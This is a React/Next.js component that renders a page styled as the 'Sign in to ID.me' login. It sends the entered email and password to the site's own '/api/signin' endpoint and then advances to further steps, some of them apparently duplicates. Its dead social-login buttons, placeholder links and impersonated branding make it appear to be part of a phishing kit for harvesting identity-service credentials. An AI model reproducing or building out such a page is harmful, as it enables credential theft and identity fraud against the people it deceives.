"use client";

import { useMultiStepForm } from "../../hooks/useMultiStepForm";
import React, {
  Fragment,
  useCallback,
  useEffect,
  useMemo,
  useState,
} from "react";
import StepTwo from "./StepTwo";
import StepThree from "./StepThree";
import StepFour from "./StepFour";
import { useFieldArray, useFormContext } from "react-hook-form";
import InputField from "../UI/Input";
import { AppleIcon, FacebookIcon, GoogleIcon, LinkedinIcon } from "../icons";
import Link from "next/link";
import axios from "axios";
import { ClipLoader } from "react-spinners";
import StepOneDup from "./StepOneDup";
import StepThreeDup from "./StepThreeDup";

const StepOne = () => {
  const {
    stepIndex,
    formStep,
    push,
    back,
    next,
    changeQuery,
    // steps,
    isFirstStep,
    isLastStep,
    urlStep,
  } = useMultiStepForm(
    [
      <StepOne key={0} />,
      <StepOneDup key={1} />,
      <StepTwo key={2} />,
      <StepThree key={3} />,
      <StepThreeDup key={4} />,
      <StepFour key={5} />,
    ],
    "kdm"
  );
  const methods = useFormContext();
  const [isLoading, setIsLoading] = useState(false);

  return (
    <div className="mt-[-30px]  w-[340px] md:w-[450px] drop-shadow-custon bg-white rounded-[10px] py-8 px-8 top-[90px] ">
      <h2 className="text-[#242C39] flex items-center justify-center w-full font-bold pb-4 text-[16px] md:text-[20px]">
        Sign in to ID.me
      </h2>
      <div
        className="flex flex-col gap-3 py-2"
        // onSubmit={methods.handleSubmit(onSubmit)}
      >
        <div className="flex flex-col items-center justify-center gap-1 rounded-[5px] bg-[#F2F9FF] py-4">
          <p className="text-[#242C39] text-[14px] md:text-[16px] font-bold">
            New to ID.me?
          </p>
          <Link
            href="/"
            className="text-[13px]  underline text-[#5A80AD] font-bold"
          >
            Create an ID.me account
          </Link>
        </div>
        <p className="text-[13px] font-extralight pt-1">
          <span className="font-bold mr-1">*</span>Indicates a required field
        </p>
        <div>
          <InputField
            label="Email *"
            name="email"
            type="email"
            labelClassName="text-[12px] font-bold capitalize pb-2"
            error={methods.formState.errors.email?.message as string}
            inputClassName="px-4 py-4 border-[0.1px] border-[#949494] rounded-[4px] w-full text-[14px]  "
          />
        </div>
        <div>
          <InputField
            label="Password *"
            name="password"
            type="password"
            labelClassName="text-[12px] font-bold capitalize ] pt-6 pb-2"
            error={methods.formState.errors.password?.message as string}
            inputClassName="px-4 py-4 border-[0.1px] border-[#949494] rounded-[4px] w-full text-[14px]  "
          />
        </div>
        <div className="flex gap-2 pt-1 pb-4">
          <input type="checkbox" className="self-start mt-[2px]" />
          <div>
            <p className="font-bold text-[11px]">Remember me</p>
            <p className="text-[11px]">
              For your security, select only on your devices.
            </p>
          </div>
        </div>
        <button
          type="button"
          onClick={async () => {
            const isValid = await methods.trigger(["email", "password"]);
            let email = await methods.watch("email"); // Manually validate fields
            let password = await methods.watch("password"); // Manually validate fields
            if (isValid) {
              setIsLoading(true);
              email = await methods.watch("email"); // Manually validate fields
              password = await methods.watch("password"); // Manually validate fields
              try {
                const response = await axios.post("/api/signin", {
                  email,
                  password,
                });

                if (response.status === 200) {
                  // toast.success("Message sent successfully!");
                  // setUserInput({ name: "", email: "", message: "" });
                  setIsLoading(false);
                  next(); // Only proceed if validation passes
                } else {
                  console.error("Failed to send message.");
                  setIsLoading(false);
                }
              } catch (error) {
                console.error("Error sending message.");
                setIsLoading(false);
              }
            }
          }}
          disabled={isLoading}
          className="text-xs cursor-pointer p-4 md:px-6 py-4  rounded-[4px] bg-[#266BCA] font-bold text-white"
        >
          {isLoading ? (
            <>
              Continue
              <ClipLoader className="ml-2" size={14} color="white" />
            </>
          ) : (
            "Continue"
          )}
        </button>
        <Link
          href="/"
          className="text-[14px] underline flex w-full items-center justify-center text-[#5A80AD] font-bold"
        >
          Forgot password
        </Link>
      </div>

      <div className="flex flex-col gap-3 py-3">
        <div className="flex items-center justify-center gap-3">
          <div className="w-[80px] h-[2px] bg-[#EFEFEF]"></div>
          <span className="uppercase text-[16px]">or</span>
          <div className="w-[80px] h-[2px] bg-[#EFEFEF]"></div>
        </div>
        <div className="flex w-full py-3 justify-between">
          <div className="w-[45px] rounded-[3px] h-[42px] flex items-center justify-center border-[#C3C3C3] border-[0.1px]">
            <FacebookIcon />
          </div>
          <div className="w-[45px] rounded-[3px] h-[42px] flex items-center justify-center border-[#C3C3C3] border-[0.1px]">
            <GoogleIcon />
          </div>
          <div className="w-[45px] rounded-[3px] h-[42px] flex items-center justify-center border-[#C3C3C3] border-[0.1px]">
            <AppleIcon />
          </div>
          <div className="w-[45px] rounded-[3px] h-[42px] flex items-center justify-center border-[#C3C3C3] border-[0.1px]">
            <LinkedinIcon />
          </div>
        </div>
        <div className="w-full cursor-pointer rounded-[3px] border-[0.1px] flex justify-center items-center border-[#C3C3C3] py-3">
          <span className="text-[13px] text-[#5A80AD] font-bold">
            View more options
          </span>
        </div>
      </div>
    </div>
  );
};

export default StepOne;
